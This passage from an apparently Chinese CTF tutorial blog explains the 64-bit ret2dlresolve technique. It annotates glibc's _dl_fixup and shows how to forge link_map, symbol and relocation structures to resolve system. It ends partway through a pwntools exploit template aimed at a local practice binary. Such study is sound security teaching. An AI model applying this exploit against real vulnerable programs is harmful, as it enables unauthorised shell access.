+  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token keyword">const</span> rel_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token operator">-></span>l_addr <span class="token operator">+</span> reloc<span class="token operator">-></span>r_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  
+  DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span>
+
+  <span class="token comment">//判断重定位表的类型，必须要为7--ELF_MACHINE_JMP_SLOT</span>
+  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_TYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span> <span class="token operator">==</span> ELF_MACHINE_JMP_SLOT<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token comment">/* Look up the target symbol.  If the normal lookup rules are not
+      used don't look in the global scope.  */</span>
+      
+   
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+   <span class="token punctuation">&#123;</span>
+     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token comment">/* We already found the symbol.  The module (and therefore its load
+   address) is also known.  */</span>
+      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-></span>l_addr <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      result <span class="token operator">=</span> l<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+  <span class="token comment">// 最后把value写入相应的GOT表条目rel_addr中</span>
+  <span class="token keyword">return</span> <span class="token function">elf_machine_fixup_plt</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> result<span class="token punctuation">,</span> reloc<span class="token punctuation">,</span> rel_addr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>与32不同，64位程序构造的数据一般在bss：</p>
+<p>如0x601000-0x602000，导致相当于.dynsym的地址0x400000-0x401000很大&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+   <span class="token punctuation">&#123;</span>
+      <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">r_found_version</span> <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>
+      <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
+    version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+      version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span></code></pre>
+
+<p>使得reloc-&gt;r_info很大&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span></code></pre>
+
+<p>出现访存出错&#x3D;&#x3D;》崩溃</p>
+<p>&#x3D;&#x3D;&#x3D;》绕过这个判断分支：</p>
+<p>1、绕过l-&gt;l_info[VERSYMIDX (DT_VERSYM)] !&#x3D; NULL，使其不成立，也就是&#x3D;NULL</p>
+<p>&#x3D;&#x3D;》使得link_map + 0x1c8为NULL&#x3D;&#x3D;》需要往link_map写空值&#x3D;&#x3D;》需要泄漏地址&#x3D;&#x3D;》<strong>不可取</strong></p>
+<p>2、绕过__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) &#x3D;&#x3D; 0&#x3D;&#x3D;》</p>
+<p>伪造sym-&gt;st_other使它不为空&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+   <span class="token punctuation">&#123;</span>
+     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token comment">/* We already found the symbol.  The module (and therefore its load
+   address) is also known.  */</span>
+      <span class="token comment">//认为该符号已经解析过，直接调用DL_FIXUP_MAKE_VALUE函数赋值</span>
+      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-></span>l_addr <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      
+      result <span class="token operator">=</span> l<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+  <span class="token comment">// 最后把value写入相应的GOT表条目rel_addr中</span>
+  <span class="token keyword">return</span> <span class="token function">elf_machine_fixup_plt</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> result<span class="token punctuation">,</span> reloc<span class="token punctuation">,</span> rel_addr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>&#x3D;&#x3D;》DL_FIXUP_MAKE_VALUE定义：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">DL_FIXUP_MAKE_VALUE</span><span class="token expression"><span class="token punctuation">(</span>map<span class="token punctuation">,</span> addr<span class="token punctuation">)</span> <span class="token punctuation">(</span>addr<span class="token punctuation">)</span></span></span>
+<span class="token comment">/* Extract the code address from a value of type DL_FIXUP_MAKE_VALUE.*/</span></code></pre>
+
+<p>直接将l-&gt;l_addr + sym-&gt;st_value赋值给value</p>
+<p>&#x3D;&#x3D;&#x3D;》sym从link_map中来&#x3D;&#x3D;》伪造link_map&#x3D;&#x3D;》</p>
+<p>若可以控制sym-&gt;st_value指向got表中的地址如：__libc_start_main的got&#x3D;&#x3D;》</p>
+<p>1-&gt;1_addr为目标地址(system)到__libc_start_main的偏移&#x3D;&#x3D;》</p>
+<p>最终的value：l-&gt;l_addr + sym-&gt;st_value就会是目标地址（system），实现无需leak地址引用</p>
+<p>&#x3D;&#x3D;&#x3D;》link_map定义：</p>
+<pre class="language-c" data-language="c"><code class="language-c">type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token punctuation">&#123;</span>
+    Elf64_Addr l_addr<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>l_name<span class="token punctuation">;</span>
+    Elf64_Dyn <span class="token operator">*</span>l_ld<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_next<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_prev<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_real<span class="token punctuation">;</span>
+    Lmid_t l_ns<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">libname_list</span> <span class="token operator">*</span>l_libname<span class="token punctuation">;</span>
+    Elf64_Dyn <span class="token operator">*</span>l_info<span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//l_info 里面包含的就是动态链接的各个表的信息</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token class-name">size_t</span> l_tls_firstbyte_offset<span class="token punctuation">;</span>
+    <span class="token class-name">ptrdiff_t</span> l_tls_offset<span class="token punctuation">;</span>
+    <span class="token class-name">size_t</span> l_tls_modid<span class="token punctuation">;</span>
+    <span class="token class-name">size_t</span> l_tls_dtor_count<span class="token punctuation">;</span>
+    Elf64_Addr l_relro_addr<span class="token punctuation">;</span>
+    <span class="token class-name">size_t</span> l_relro_size<span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> l_serial<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">auditstate</span> l_audit<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token operator">*</span></code></pre>
+
+
+
+<p>&#x3D;&#x3D;》首先伪造1-&gt;1_addr为目标地址system与__libc_start_main的偏移</p>
+<p>&#x3D;&#x3D;》接下来构造sym-&gt;st_value指向__libc_start_main的got表的地址&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//获取符号表地址</span>
+  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token keyword">const</span> symtab<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_SYMTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token comment">//获取函数对应的重定位表结构地址</span>
+  <span class="token keyword">const</span> PLTREL <span class="token operator">*</span><span class="token keyword">const</span> reloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_JMPREL<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> reloc_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token comment">//获取函数对应的符号表结构地址</span>
+  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span>sym <span class="token operator">=</span> <span class="token operator">&amp;</span>symtab<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
+
+<p>&#x3D;&#x3D;》sym通过&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]获得&#x3D;&#x3D;》</p>
+<p>将reloc-&gt;r_info设置为0&#x3D;&#x3D;》</p>
+<p>控制symtab的第一个元素st_value指向__libc_start_main的got表的位置&#x3D;&#x3D;》</p>
+<p>symtab是l_info[DT_SYMTAB]&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DT_SYMTAB</span> <span class="token expression"><span class="token number">6</span></span></span></code></pre>
+
+<p>&#x3D;&#x3D;》symtab是l_info[0x6]&#x3D;&#x3D;》构造l_info[0x6]指向link_map+0x70,在link_map+0x78的位置填入__libc_start_main的got表减8的地址&#x3D;&#x3D;》</p>
+<p>symtab指向了__libc_start_main_got-8&#x3D;&#x3D;》</p>
+<p>st_value的偏移为8&#x3D;&#x3D;》实现st_value指向__libc_start_main_got&#x3D;&#x3D;》</p>
+<p><strong>由于symtab指向了__libc_start_main_got-8，地址一般也为got表地址，所以sym-&gt;st_other不为0成立</strong></p>
+<p>返回目标地址：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//获取函数对应的重定位表结构地址</span>
+  <span class="token keyword">const</span> PLTREL <span class="token operator">*</span><span class="token keyword">const</span> reloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_JMPREL<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> reloc_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token comment">//得到函数对应的got地址，即真实函数地址要填回的地址</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token keyword">const</span> rel_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token operator">-></span>l_addr <span class="token operator">+</span> reloc<span class="token operator">-></span>r_offset<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>若rel_addr（最终得到的地址）在link_map+0x28&#x3D;&#x3D;》</p>
+<p>是由l-&gt;l_addr + reloc-&gt;r_offset得到&#x3D;&#x3D;》</p>
+<p>l-&gt;l_addr已经确定&#x3D;&#x3D;》为目标地址到got表中libc地址的偏移</p>
+<p>需要控制reloc-&gt;r_offset使其加上l-&gt;l_addr为link_map+0x28的地址&#x3D;&#x3D;》</p>
+<p>若将reloc设定在link_map+0x30&#x3D;&#x3D;》reloc_offset已经确定，由reloc_index*8确定&#x3D;&#x3D;》</p>
+<p>需要伪造l_info[DT_JMPREL]&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DT_JMPREL</span> <span class="token expression"><span class="token number">23</span></span></span></code></pre>
+
+<p>需要伪造.rel.plt表所对应的Elf64_Dyn结构体，将l_info[DT_JMPREL]指向link_map+0x80-8&#x3D;&#x3D;》</p>
+<p>即d_ptr为link_map+0x80&#x3D;&#x3D;》在link_map+0x80中写入link_map+0x30-reloc_offset的值&#x3D;&#x3D;》</p>
+<p>使得.rel.plt表的地址为link_map+0x30-reloc_offset&#x3D;&#x3D;》</p>
+<p>经过</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span><span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_JMPREL<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> reloc_offset<span class="token punctuation">)</span></code></pre>
+
+<p>得到reloc指向link_map+0x30&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c">Elf64_Rela
+type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+    Elf64_Addr r_offset<span class="token punctuation">;</span>
+    Elf64_Xword r_info<span class="token punctuation">;</span>
+    Elf64_Sxword r_addend<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>在link_map+0x30中伪造Elf64_Rela结构体，在r_offset填入link_map+0x28减去l-&gt;l_addr的值</p>
+<p>&#x3D;&#x3D;&#x3D;》最终得到的rel_addr为link_map+0x28,同时将r_info填入0x7绕过前面对类型的判定</p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;》最终形态：</p>
+<p>sym-&gt;st_other不为0</p>
+<p>rel_addr指向link_map+0x30</p>
+<p>sym-&gt;st_value地址为__libc_start_main_got地址</p>
+<p>1-&gt;1_addr为system到__libc_start_main的偏移</p>
+<p>&#x3D;&#x3D;&#x3D;》经过</p>
+<pre class="language-c" data-language="c"><code class="language-c">value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-></span>l_addr <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>得到value为system地址，在最后写入到rel_addr&#x3D;&#x3D;》link_map+0x30中，实现对system函数的调用</p>
+<h4 id="涉及的结构体：-1"><a href="#涉及的结构体：-1" class="headerlink" title="涉及的结构体："></a>涉及的结构体：</h4><pre class="language-c" data-language="c"><code class="language-c">type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token punctuation">&#123;</span>
+    Elf64_Addr l_addr<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>l_name<span class="token punctuation">;</span>
+    Elf64_Dyn <span class="token operator">*</span>l_ld<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_next<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_prev<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_real<span class="token punctuation">;</span>
+    Lmid_t l_ns<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">libname_list</span> <span class="token operator">*</span>l_libname<span class="token punctuation">;</span>
+    Elf64_Dyn <span class="token operator">*</span>l_info<span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//l_info 里面包含的就是动态链接的各个表的信息</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token class-name">size_t</span> l_tls_firstbyte_offset<span class="token punctuation">;</span>
+    <span class="token class-name">ptrdiff_t</span> l_tls_offset<span class="token punctuation">;</span>
+    <span class="token class-name">size_t</span> l_tls_modid<span class="token punctuation">;</span>
+    <span class="token class-name">size_t</span> l_tls_dtor_count<span class="token punctuation">;</span>
+    Elf64_Addr l_relro_addr<span class="token punctuation">;</span>
+    <span class="token class-name">size_t</span> l_relro_size<span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> l_serial<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">auditstate</span> l_audit<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token operator">*</span>
+
+Elf64_Sym
+type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+    Elf64_Word st_name<span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_info<span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_other<span class="token punctuation">;</span>
+    Elf64_Section st_shndx<span class="token punctuation">;</span>
+    Elf64_Addr st_value<span class="token punctuation">;</span>
+    Elf64_Xword st_size<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+Elf64_Dyn
+type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+    Elf64_Sxword d_tag<span class="token punctuation">;</span>
+    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
+        Elf64_Xword d_val<span class="token punctuation">;</span>
+        Elf64_Addr d_ptr<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> d_un<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+Elf64_Rela
+type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+    Elf64_Addr r_offset<span class="token punctuation">;</span>
+    Elf64_Xword r_info<span class="token punctuation">;</span>
+    Elf64_Sxword r_addend<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+
+
+
+
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>伪造sym-&gt;st_value等于某个got上已经解析的函数的表项（read@got）&#x3D;&#x3D;&gt;</p>
+<p>在l-&gt;l_addr设置为system与这个函数的偏移&#x3D;&#x3D;》</p>
+<p>link_map伪造：</p>
+<p>link_map+0x68的DT_STRTAB指针为可读地址</p>
+<p>link_map+0x70的DT_SYMTAB指针</p>
+<p>link_map+0xf8的DT_JMPREL指针</p>
+<p>&#x3D;&#x3D;》</p>
+<p>.dynamic:</p>
+<p>DT_SYMTAB结构体</p>
+<p>DT_JMPPREL结构体</p>
+<p>函数对应的Elf64_Rela结构体&#x3D;&#x3D;》一般在构造过程中将reloc_arg作为0进行构造</p>
+<h3 id="例题：-1"><a href="#例题：-1" class="headerlink" title="例题："></a>例题：</h3><p>1、检查保护：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220329143811306.png"></p>
+<p>2、主函数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220329143922756.png"></p>
+<h4 id="exp（模板）：-1"><a href="#exp（模板）：-1" class="headerlink" title="exp（模板）："></a>exp（模板）：</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=UTF-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+
+plt0<span class="token operator">=</span>elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
+
+pop_rdi_ret<span class="token operator">=</span><span class="token number">0x401223</span>
+pop_rsi_r15_ret<span class="token operator">=</span><span class="token number">0x401221</span>
+ret<span class="token operator">=</span><span class="token number">0x4011BE</span>
+fake_link_map_addr<span class="token operator">=</span><span class="token number">0x404100</span>
+
+
+<span class="token keyword">def</span> <span class="token function">get_fake_link_map</span><span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">,</span>l_addr<span class="token punctuation">,</span>st_value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment">#各个指针的伪造地址</span>
+    fake_Elf64_Dyn_STR_addr<span class="token operator">=</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">)</span>
+    fake_Elf64_Dyn_SYM_addr<span class="token operator">=</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span>
+    fake_Elf64_Dyn_JMPREL_addr<span class="token operator">=</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span>
+    
+    <span class="token comment">#伪造结构体</span>
+    fake_Elf64_Dyn_SYM<span class="token operator">=</span>flat<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>st_value<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    fake_Elf64_Dyn_JMPREL<span class="token operator">=</span>flat<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token comment">#JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28</span>
+	
+    r_offset<span class="token operator">=</span>fake_link_map_addr<span class="token operator">-</span>l_addr
+    fake_Elf64_rela<span class="token operator">=</span>flat<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    <span class="token comment">#fake_link_map整体结构</span>
+    fake_link_map<span class="token operator">=</span>flat<span class="token punctuation">(</span>	<span class="token comment">#0x0</span>
+        p64<span class="token punctuation">(</span>l_addr<span class="token punctuation">)</span><span class="token punctuation">,</span>	<span class="token comment">#0x8</span>
+        fake_Elf64_Dyn_SYM<span class="token punctuation">,</span>	<span class="token comment">#0x18</span>
+        fake_Elf64_Dyn_JMPREL<span class="token punctuation">,</span>	<span class="token comment">#0x28</span>
+        fake_Elf64_rela<span class="token punctuation">,</span>	<span class="token comment">#0x40</span>
+        <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">,</span>	<span class="token comment">#凑齐0x68，开始放指针</span>
+        fake_Elf64_Dyn_STR_addr<span class="token punctuation">,</span>  <span class="token comment">#STRTAB指针，0x70</span>
+        fake_Elf64_Dyn_SYM_addr<span class="token punctuation">,</span>	<span class="token comment">#SYMTAB指针，0x78</span>
+        <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        fake_Elf64_Dyn_JMPREL_addr<span class="token punctuation">,</span>	<span class="token comment">#JMPEREL指针</span>
+    <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> fake_link_map
+
+l_addr<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+<span class="token comment">#read此时为一个已解析函数，取它与system的偏移为l_addr</span>
+
+st_value<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+<span class="token comment">#value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);</span>
+
+fake_link_map<span class="token operator">=</span>get_fake_link_map<span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">,</span>l_addr<span class="token punctuation">,</span>st_value<span class="token punctuation">)</span>
+<span class="token comment">#获得伪造的link_map</span>
+
